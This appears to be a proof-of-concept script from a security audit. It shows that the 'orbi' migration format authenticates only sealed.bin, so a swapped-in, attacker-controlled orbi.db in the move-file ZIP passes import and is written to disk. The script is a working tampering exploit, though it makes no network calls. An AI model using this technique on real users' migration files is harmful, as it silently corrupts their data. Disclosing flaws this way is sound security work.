#!/usr/bin/env python3
"""PoC 3 — move-file HMAC leaves orbi.db/backups unauthenticated (CWE-345, Medium).

Vulnerable code:
  migrate.py:16-18    docstring claims the HMAC tag is "over everything"
  migrate.py:66-72    seal() tags only header + the sealed JSON payload
  migrate.py:122-138  orbi.db, kev_ids.json, router-backups/* go into the ZIP unsealed
  migrate.py:148-176  import checks only manifest format + sealed.bin, then copies every
                      other ZIP entry to disk

Builds a valid move file with the correct passphrase, swaps in an attacker-chosen orbi.db
WITHOUT touching sealed.bin, and shows import() accepts it and writes it to the data dir.
"""
import argparse
import json
import sqlite3
import tempfile
import time
import zipfile
from pathlib import Path

from poc_common import orbi_arg, load_orbi

PASSPHRASE = "correct-passphrase"


def make_db(path: Path, marker: str):
    with sqlite3.connect(path) as c:
        c.execute("CREATE TABLE devices (mac TEXT, router_name TEXT)")
        c.execute("INSERT INTO devices VALUES (?, ?)", (marker, "attacker-controlled row"))


def read_db(path: Path):
    with sqlite3.connect(path) as c:
        return c.execute("SELECT mac, router_name FROM devices").fetchall()


def main():
    ap = argparse.ArgumentParser()
    orbi_arg(ap)
    args = ap.parse_args()
    load_orbi(args)

    from orbi import migrate

    payload = {"settings": {"port": 8470, "alert_new_devices": True},
               "secrets": {}, "sensitive": {}, "pin_guesses": {}}
    sealed = migrate.seal(json.dumps(payload).encode(), PASSPHRASE)
    manifest = {"format": migrate.FORMAT, "made": time.time(), "from": "linux",
                "version": "0", "secrets": [], "unreadable_secrets": []}

    with tempfile.TemporaryDirectory(prefix="orbi-poc3-") as td:
        td = Path(td)
        good_db = td / "good.db"
        make_db(good_db, "AA:BB:CC:DD:EE:FF")
        good_zip = td / "good.zip"
        with zipfile.ZipFile(good_zip, "w") as z:
            z.writestr("manifest.json", json.dumps(manifest))
            z.writestr("sealed.bin", sealed)
            z.write(good_db, "orbi.db")

        evil_db = td / "evil.db"
        make_db(evil_db, "DE:AD:BE:EF:00:01")
        evil_zip = td / "evil.zip"
        with zipfile.ZipFile(good_zip) as src, zipfile.ZipFile(evil_zip, "w") as dst:
            for item in src.infolist():
                data = evil_db.read_bytes() if item.filename == "orbi.db" else src.read(item.filename)
                dst.writestr(item, data)

        with zipfile.ZipFile(good_zip) as a, zipfile.ZipFile(evil_zip) as b:
            assert a.read("sealed.bin") == b.read("sealed.bin") == sealed
            assert json.loads(migrate.unseal(b.read("sealed.bin"), PASSPHRASE)) == payload
        print("[*] sealed.bin and its HMAC tag are byte-identical in both move files")

        imported = {}
        for label, archive in (("legitimate", good_zip), ("tampered", evil_zip)):
            dest = td / f"import-{label}"
            migrate.import_(archive, PASSPHRASE, data_dir=dest)
            imported[label] = read_db(dest / "orbi.db")
            print(f"[+] {label:10s} import: unseal OK, applied devices = {imported[label]}")

        assert imported["legitimate"] != imported["tampered"], "tampered DB did not land on disk"
    print("[+] CONFIRMED: unsealed DB entry accepted with the correct passphrase, HMAC untouched")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
